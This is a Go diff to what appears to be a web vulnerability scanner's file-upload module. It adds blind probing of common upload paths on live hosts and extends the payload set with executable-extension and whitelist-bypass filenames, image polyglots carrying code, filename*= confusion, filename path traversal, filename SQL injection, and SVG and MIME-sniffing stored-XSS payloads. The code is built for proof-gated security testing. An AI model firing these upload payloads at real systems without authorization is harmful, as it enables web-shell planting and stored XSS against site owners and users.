@@ -16,6 +16,10 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"image"
+	"image/gif"
+	"image/jpeg"
+	"image/png"
 	"io"
 	"mime/multipart"
 	"net/http"
@@ -69,6 +73,7 @@ const (
 	proofOOB
 	proofZipSlip
 	proofConfigEffect
+	proofSQLiError
 )
 
 type fileUploadAttempt struct {
@@ -77,6 +82,11 @@ type fileUploadAttempt struct {
 	marker                               string
 	proof                                uploadProofKind
 	oobKind                              string
+	// dispositionOverride, when non-empty, replaces the normal single-filename
+	// Content-Disposition header verbatim. Used for confusion attacks that need
+	// more than one filename parameter (RFC 5987 filename*=) or a raw control
+	// byte a %q-quoted Sprintf would otherwise escape (null-byte truncation).
+	dispositionOverride string
 }
 
 type uploadResult struct {
@@ -173,6 +183,32 @@ func (s *FileUploadScanner) Run(ctx context.Context, targetID string, logFn LogF
 			}
 		}
 	}
+	// Every upstream discoverer (JS static analysis, OpenAPI/Swagger parsing,
+	// directory/path discovery) can only ever hand this module a "parameter"
+	// it already recorded; a bare literal like "/api/upload" seen only in a JS
+	// bundle, or an upload widget's conventional path implied by nothing but
+	// product documentation, never becomes a `parameters` row and so is
+	// structurally invisible to loadRoutedInsertionPoints above. This closes
+	// that gap independently, by trying common upload paths directly against
+	// every live host this target has — regardless of which module (or none)
+	// ever found that host.
+	if len(points) < limit {
+		seen := make(map[string]bool, len(points))
+		for _, p := range points {
+			seen[p.URL+"|"+p.Param] = true
+		}
+		for _, ip := range s.discoverBlindUploadPoints(ctx, targetID, logFn) {
+			key := ip.URL + "|" + ip.Param
+			if seen[key] {
+				continue
+			}
+			seen[key] = true
+			points = append(points, ip)
+			if len(points) == limit {
+				break
+			}
+		}
+	}
 	if len(points) == 0 {
 		logFn("info", "file_upload", "No eligible multipart or file-like structured insertion points")
 		return nil
@@ -197,6 +233,179 @@ func (s *FileUploadScanner) Run(ctx context.Context, targetID string, logFn LogF
 	wg.Wait()
 	logFn("info", "file_upload", fmt.Sprintf("File-upload checks complete: %d verified finding(s)", findings.Load()))
 	return ctx.Err()
+}
+
+const (
+	fileUploadBlindProbeConcurrency = 10
+	fileUploadBlindMaxLiveEndpoints = 12
+	fileUploadBlindMaxBases         = 40
+)
+
+// defaultUploadPaths seeds blind discovery of upload endpoints (see
+// discoverBlindUploadPoints) that no other module ever surfaced as a
+// "parameter": a bare literal like "/api/upload" seen only inside a JS
+// bundle, or a third-party upload-widget connector path implied only by that
+// widget's own documentation, never produces a body/multipart field for
+// loadRoutedInsertionPoints to route. Covers common app-framework upload
+// routes and the handful of third-party upload widgets (CKEditor/CKFinder/
+// FCKeditor, TinyMCE filemanager, elFinder, Plupload, jQuery-File-Upload)
+// still found on real targets. Operator-extensible via the "upload" corpus
+// category, same as backup/directory wordlists.
+var defaultUploadPaths = []string{
+	"/upload", "/uploads", "/api/upload", "/api/uploads", "/api/v1/upload", "/api/v1/uploads",
+	"/api/v1/files", "/api/v1/media", "/api/file", "/api/files", "/api/files/upload",
+	"/api/media/upload", "/api/media", "/api/attachments", "/api/attachment/upload",
+	"/file/upload", "/files/upload", "/media/upload", "/admin/upload", "/admin/upload.php",
+	"/upload.php", "/uploader.php", "/uploadify/uploadify.php", "/plupload/examples/upload.php",
+	"/jquery-file-upload/server/php/index.php", "/elfinder/php/connector.php",
+	"/elFinder/php/connector.php", "/ckeditor/filemanager/connectors/php/upload.php",
+	"/ckfinder/core/connector/php/connector.php", "/fckeditor/editor/filemanager/connectors/php/upload.php",
+	"/tiny_mce/plugins/filemanager/upload.php", "/tinymce/plugins/filemanager/upload.php",
+	"/wp-admin/async-upload.php", "/wp-json/wp/v2/media", "/rest/upload", "/rest/v1/upload",
+	"/avatar/upload", "/user/avatar", "/profile/avatar", "/account/avatar",
+	"/attachments/upload", "/document/upload", "/documents/upload",
+	"/FileUploadHandler.ashx", "/handlers/fileupload.ashx", "/upload.ashx",
+}
+
+// blindUploadFieldNames is deliberately short (not the full uploadFieldNames
+// map): each extra name doubles the request volume of every path on every
+// live host, and this module already stays inside Reconner's non-abusive
+// blind-guess envelope (comparable in scale to exposure.go's config-leak
+// path list) rather than exhaustively trying every known upload field name
+// against every guessed path.
+var blindUploadFieldNames = []string{"file", "avatar"}
+
+// discoverBlindUploadPoints probes common upload paths against every live
+// host this target has, independent of whether any other module ever
+// recorded a matching `parameters` row. It sends ONE harmless multipart
+// probe (a small text file) per (host, path, field-name) combination; only
+// combinations that plausibly accept a multipart upload — a non-404/405
+// response that doesn't match the host's own soft-404 catch-all baseline —
+// are turned into an insertion point and handed to the full attack-payload
+// ladder. This never claims a vulnerability itself; it only decides what is
+// worth running the real proof-gated attempts against.
+func (s *FileUploadScanner) discoverBlindUploadPoints(ctx context.Context, targetID string, logFn LogFunc) []insertionPoint {
+	corpusDir := ""
+	if s.cfg != nil {
+		corpusDir = s.cfg.WordlistsDir
+	}
+	paths := LoadCorpus(corpusDir, "upload", defaultUploadPaths)
+	bases := s.loadUploadServiceBases(ctx, targetID, fileUploadBlindMaxBases)
+	if len(bases) == 0 || len(paths) == 0 {
+		return nil
+	}
+
+	sem := make(chan struct{}, fileUploadBlindProbeConcurrency)
+	var wg sync.WaitGroup
+	var mu sync.Mutex
+	var found []insertionPoint
+
+	for _, base := range bases {
+		if ctx.Err() != nil {
+			break
+		}
+		mu.Lock()
+		full := len(found) >= fileUploadBlindMaxLiveEndpoints
+		mu.Unlock()
+		if full {
+			break
+		}
+		b := strings.TrimRight(base, "/")
+		wg.Add(1)
+		sem <- struct{}{}
+		go func(b string) {
+			defer wg.Done()
+			defer func() { <-sem }()
+			bl := soft404Baseline(ctx, b)
+			for _, p := range paths {
+				if ctx.Err() != nil {
+					return
+				}
+				mu.Lock()
+				full := len(found) >= fileUploadBlindMaxLiveEndpoints
+				mu.Unlock()
+				if full {
+					return
+				}
+				u := b + p
+				if !urlHostInScope(ctx, u) || !urlInEndpointScope(ctx, u) {
+					continue
+				}
+				field, status, body := s.probeBlindUpload(ctx, u)
+				if field == "" || bl.matches(status, []byte(body), "") {
+					continue
+				}
+				mu.Lock()
+				if len(found) < fileUploadBlindMaxLiveEndpoints {
+					found = append(found, insertionPoint{URL: u, Param: field, Method: "POST", Location: "multipart", ContentType: "multipart/form-data"})
+				}
+				mu.Unlock()
+			}
+		}(b)
+	}
+	wg.Wait()
+	if len(found) > 0 {
+		logFn("info", "file_upload", fmt.Sprintf("Blind discovery found %d upload endpoint(s) with no prior known parameter", len(found)))
+	}
+	return found
+}
+
+// probeBlindUpload tries each candidate field name in turn and returns the
+// first that yields a response distinguishable from a routing-level 404/405
+// (proving only that the endpoint parses multipart uploads at all — never
+// that anything about it is exploitable).
+func (s *FileUploadScanner) probeBlindUpload(ctx context.Context, u string) (field string, status int, body string) {
+	for _, name := range blindUploadFieldNames {
+		if ctx.Err() != nil {
+			return "", 0, ""
+		}
+		var buf bytes.Buffer
+		mw := multipart.NewWriter(&buf)
+		if part, err := mw.CreateFormFile(name, "recon-probe.txt"); err == nil {
+			_, _ = part.Write([]byte("reconner upload discovery probe"))
+		}
+		_ = mw.Close()
+		reqCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+		req, err := http.NewRequestWithContext(reqCtx, http.MethodPost, u, &buf)
+		if err != nil {
+			cancel()
+			continue
+		}
+		req.Header.Set("Content-Type", mw.FormDataContentType())
+		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ReconBot/1.0)")
+		resp, err := fileUploadClient.Do(req)
+		cancel()
+		if err != nil {
+			continue
+		}
+		raw, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
+		resp.Body.Close()
+		if resp.StatusCode == 404 || resp.StatusCode == 405 {
+			continue
+		}
+		return name, resp.StatusCode, string(raw)
+	}
+	return "", 0, ""
+}
+
+func (s *FileUploadScanner) loadUploadServiceBases(ctx context.Context, targetID string, limit int) []string {
+	rows, err := s.db.QueryContext(ctx, `
+		SELECT url FROM http_services
+		WHERE target_id = ? AND status_code BETWEEN 200 AND 403
+		ORDER BY url LIMIT ?
+	`, targetID, limit)
+	if err != nil {
+		return nil
+	}
+	defer rows.Close()
+	var bases []string
+	for rows.Next() {
+		var u string
+		if err := rows.Scan(&u); err == nil {
+			bases = append(bases, u)
+		}
+	}
+	return filterURLsByHostScope(ctx, bases)
 }
 
 func (s *FileUploadScanner) scanPoint(ctx context.Context, targetID string, ip insertionPoint, auth map[string]string, logFn LogFunc) int {
@@ -229,6 +438,8 @@ func (s *FileUploadScanner) scanPoint(ctx context.Context, targetID string, ip i
 			proofURL, evidence = s.verifyZipSlip(attemptCtx, ip, auth, attempt, result.urls)
 		case proofConfigEffect:
 			proofURL, evidence = s.verifyConfigEffect(attemptCtx, ip, auth, attempt)
+		case proofSQLiError:
+			proofURL, evidence = s.verifySQLiFilename(attemptCtx, ip, auth, attempt, result.body)
 		}
 		cancelAttempt()
 		if evidence == "" {
@@ -257,8 +468,9 @@ func fileUploadAttempts(oob oobCapability, hasOOB bool, db *database.DB, targetI
 			contentType: contentType, body: executableUploadBody(language, marker, prefix), marker: marker, proof: proofExecution})
 	}
 	for _, spec := range []struct{ ext, language string }{
-		{".phtml", "php"}, {".pht", "php"}, {".phar", "php"}, {".php5", "php"}, {".php7", "php"}, {".inc", "php"}, {".PhP", "php"},
-		{".jspx", "jspx"}, {".asp", "asp"}, {".asa", "asp"}, {".cer", "asp"},
+		{".phtml", "php"}, {".pht", "php"}, {".phar", "php"}, {".php5", "php"}, {".php7", "php"}, {".php3", "php"}, {".php4", "php"},
+		{".phtm", "php"}, {".pgif", "php"}, {".inc", "php"}, {".PhP", "php"}, {".pHp", "php"}, {".PHP", "php"},
+		{".jspx", "jspx"}, {".jspf", "jsp"}, {".asp", "asp"}, {".asa", "asp"}, {".cer", "asp"}, {".ASP", "asp"}, {".Asp", "asp"},
 		{".cfm", "cfm"}, {".cfml", "cfm"},
 		{".shtml", "ssi"}, {".cgi", "shell"}, {".pl", "perl"}, {".py", "python"}, {".rb", "ruby"},
 	} {
@@ -266,20 +478,93 @@ func fileUploadAttempts(oob oobCapability, hasOOB bool, db *database.DB, targetI
 	}
 	for _, suffix := range []string{
 		".php.jpg", ".jpg.php", ".php%00.jpg", ".php ", ".php.",
-		".php;.jpg", ".p.phphp", ".php::$DATA.jpg", ".php...jpg",
+		".php;.jpg", ".p.phphp", ".php::$DATA.jpg", ".php...jpg", ".php.​", ".php%20.jpg",
 	} {
 		addExec("extension whitelist bypass", "extension_whitelist", "recon"+suffix, "image/jpeg", "php", "")
 	}
 	addExec("PHP content-type mismatch", "content_type_mismatch", "recon.php", "image/jpeg", "php", "")
 	addExec("JSP content-type mismatch", "content_type_mismatch", "recon.jsp", "image/jpeg", "jsp", "")
 	addExec("ASPX content-type mismatch", "content_type_mismatch", "recon.aspx", "image/jpeg", "aspx", "")
-	addExec("GIF magic-byte polyglot", "magic_byte_polyglot", "recon.php.gif", "image/gif", "php", "GIF89a\n")
+	// Real, independently-decodable 1x1 images (built with Go's own stdlib
+	// encoders, not a hand-rolled byte guess) with the payload appended after
+	// the format's own terminator (GIF trailer / JPEG EOI / PNG IEND). A
+	// getimagesize()-style validator that actually parses the image accepts
+	// these; a naive one that only checks the leading magic bytes always did.
+	// The old version just prepended the literal text "GIF89a" with no real
+	// image structure behind it, so any handler that actually decoded the
+	// upload rejected it outright.
+	for _, spec := range []struct{ format, ext, language, mime string }{
+		{"gif", ".php.gif", "php", "image/gif"},
+		{"jpeg", ".php.jpg", "php", "image/jpeg"},
+		{"png", ".php.png", "php", "image/png"},
+		{"jpeg", ".jspx.jpg", "jspx", "image/jpeg"},
+	} {
+		addExec(strings.ToUpper(spec.format)+" magic-byte polyglot (real decodable image)", "magic_byte_polyglot", "recon"+spec.ext, spec.mime, spec.language, string(imagePolyglotPrefix(spec.format)))
+	}
 	addExec("server rename survival", "server_rename_survival", "recon-rename.php", "application/octet-stream", "php", "")
+
+	// RFC 5987 filename*= confusion: a validator that only inspects the plain
+	// ASCII `filename` parameter sees a safe extension while a multipart
+	// parser that prefers the extended `filename*` parameter (as several
+	// frameworks do) stores the dangerous one instead.
+	{
+		marker := newXSSToken("rcnup")
+		disp := fmt.Sprintf(`form-data; name=%q; filename="recon-safe.jpg"; filename*=UTF-8''recon-ext.php`, ip.Param)
+		out = append(out, fileUploadAttempt{name: "RFC 5987 filename*= confusion", subtype: "filename_star_confusion",
+			filename: "recon-ext.php", contentType: "image/jpeg", body: executableUploadBody("php", marker, ""),
+			marker: marker, proof: proofExecution, dispositionOverride: disp})
+	}
+	// Path traversal in the upload's OWN filename field (distinct from the
+	// zip/tar archive-member traversal below): some frameworks join the
+	// user-supplied filename onto the storage directory without stripping
+	// "../" segments. Verification is response-hint-only (verifyExecution),
+	// consistent with this codebase never guessing an unconfirmed absolute
+	// path on its own.
+	for _, depth := range []string{"../", "../../", "../../../", "../../../../"} {
+		marker := newXSSToken("rcnup")
+		out = append(out, fileUploadAttempt{name: "Filename path traversal", subtype: "filename_path_traversal",
+			filename: depth + "recon-trav.php", contentType: "application/octet-stream", body: executableUploadBody("php", marker, ""),
+			marker: marker, proof: proofExecution})
+	}
+	// Filename metadata SQL injection: many apps insert the raw filename into
+	// an audit/media-library row unsanitized. Proof is differential (a second,
+	// clean-filename upload is compared against this response for a NEW
+	// database error signature), matching this codebase's error-based SQLi
+	// methodology elsewhere rather than trusting a single response in isolation.
+	out = append(out, fileUploadAttempt{name: "SQLi via filename metadata (error-based)", subtype: "filename_sqli_error",
+		filename: `recon'"sqli.txt`, contentType: "text/plain", body: []byte("reconner sqli filename probe"),
+		marker: newXSSToken("rcnsqli"), proof: proofSQLiError})
 
 	xssMarker := newXSSToken("rcnsvg")
 	svg := `<svg xmlns="http://www.w3.org/2000/svg" onload="document.title='` + xssMarker + `'">` +
 		`<script>document.title='` + xssMarker + `'</script></svg>`
 	out = append(out, fileUploadAttempt{name: "SVG stored XSS", subtype: "svg_stored_xss", filename: "recon.svg", contentType: "image/svg+xml", body: []byte(svg), marker: xssMarker, proof: proofStoredSVG})
+
+	// A sanitizer that strips <script>/onload but not every event handler is a
+	// common partial defense; these use different elements/handlers so at
+	// least one usually survives.
+	for _, spec := range []struct{ subtype, filename, body string }{
+		{"svg_stored_xss", "recon-animate.svg", `<svg xmlns="http://www.w3.org/2000/svg"><animate attributeName="x" from="0" to="0" dur="1s" begin="0s" onbegin="document.title='%MARKER%'"/></svg>`},
+		{"svg_stored_xss", "recon-foreign.svg", `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><foreignObject width="100" height="50"><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="document.title='%MARKER%'"></body></foreignObject></svg>`},
+	} {
+		marker := newXSSToken("rcnsvg")
+		body := strings.ReplaceAll(spec.body, "%MARKER%", marker)
+		out = append(out, fileUploadAttempt{name: "SVG stored XSS (sanitizer-bypass variant)", subtype: spec.subtype, filename: spec.filename, contentType: "image/svg+xml", body: []byte(body), marker: marker, proof: proofStoredSVG})
+	}
+
+	// Stored XSS via browser MIME-sniffing on a non-SVG "image" upload: the
+	// body starts with an HTML-sniff-triggering token (per the WHATWG
+	// mime-sniffing spec) despite an image extension/Content-Type, betting
+	// that the app never validates real pixel content and later serves the
+	// file with no/generic Content-Type — letting the browser sniff and
+	// render it as HTML. Distinct bug class from the SVG-specific one above:
+	// it fires even where SVG uploads are specifically blocklisted.
+	for _, ext := range []string{".jpg", ".png", ".gif"} {
+		marker := newXSSToken("rcnsniff")
+		body := "<!DOCTYPE html><html><body><script>document.title='" + marker + "'</script></body></html>"
+		out = append(out, fileUploadAttempt{name: "Stored XSS via MIME-sniffing", subtype: "html_mime_sniff_stored_xss",
+			filename: "recon-sniff" + ext, contentType: "image/jpeg", body: []byte(body), marker: marker, proof: proofStoredSVG})
+	}
 
 	if hasOOB {
 		for _, spec := range []struct{ name, subtype, filename, mime, kind, format string }{
@@ -349,6 +634,28 @@ func executableUploadBody(language, marker, prefix string) []byte {
 	return []byte(prefix + code)
 }
 
+// imagePolyglotPrefix returns a genuine 1x1 image, encoded by Go's own
+// stdlib codec, that a caller appends executable code after. Real decoders
+// (and getimagesize()-style validators, which only parse up to the format's
+// own terminator: the GIF trailer, JPEG EOI, or PNG IEND) accept it as a
+// valid image; trailing bytes after that terminator are not part of the
+// image stream and are simply ignored, which is exactly the classic
+// polyglot trick — but built from a real encoder instead of a hand-guessed
+// byte sequence that a strict validator would reject.
+func imagePolyglotPrefix(format string) []byte {
+	img := image.NewGray(image.Rect(0, 0, 1, 1))
+	var buf bytes.Buffer
+	switch format {
+	case "jpeg":
+		_ = jpeg.Encode(&buf, img, nil)
+	case "png":
+		_ = png.Encode(&buf, img)
+	default:
+		_ = gif.Encode(&buf, img, nil)
+	}
+	return buf.Bytes()
+}
+
 func tarGzipUpload(name string, body []byte) []byte {
 	var buf bytes.Buffer
 	gw := gzip.NewWriter(&buf)
@@ -394,7 +701,11 @@ func (s *FileUploadScanner) upload(ctx context.Context, ip insertionPoint, auth 
 			}
 		}
 		h := make(textproto.MIMEHeader)
-		h.Set("Content-Disposition", fmt.Sprintf(`form-data; name=%q; filename=%q`, ip.Param, a.filename))
+		if a.dispositionOverride != "" {
+			h.Set("Content-Disposition", a.dispositionOverride)
+		} else {
+			h.Set("Content-Disposition", fmt.Sprintf(`form-data; name=%q; filename=%q`, ip.Param, a.filename))
+		}
 		h.Set("Content-Type", a.contentType)
 		part, err := mw.CreatePart(h)
 		if err != nil {
@@ -727,6 +1038,24 @@ func (s *FileUploadScanner) verifyConfigEffect(ctx context.Context, ip insertion
 		return "", ""
 	}
 	return proofURL, "Uploaded " + configAttempt.filename + " changed web-root handler behavior; a separately uploaded .rcn file then executed marker " + configAttempt.marker
+}
+
+// verifySQLiFilename re-uploads the SAME attempt under a clean, quote-free
+// filename and compares the two responses for a NEW SQL error signature
+// (sqlErrorAppeared, shared with the SQLi module) rather than pattern-matching
+// the payload response alone — an app that always shows a generic "invalid
+// file" error for any unusual filename would otherwise look identical to a
+// real injection.
+func (s *FileUploadScanner) verifySQLiFilename(ctx context.Context, ip insertionPoint, auth map[string]string, a fileUploadAttempt, injectedBody string) (string, string) {
+	clean := fileUploadAttempt{name: a.name, subtype: a.subtype, filename: "reconclean.txt", contentType: a.contentType, body: a.body}
+	result, err := s.upload(ctx, ip, auth, clean)
+	if err != nil || result.status < 200 || result.status >= 400 {
+		return "", ""
+	}
+	if !sqlErrorAppeared(result.body, injectedBody) {
+		return "", ""
+	}
+	return ip.URL, "Filename containing a SQL metacharacter (') triggered a new database error signature absent from an identical upload with a clean filename — the filename is very likely inserted into a query unsanitized"
 }
 
 func (s *FileUploadScanner) storeFinding(ctx context.Context, targetID string, ip insertionPoint, a fileUploadAttempt, proofURL, evidence string, uploadEvidence EvidenceItem) bool {
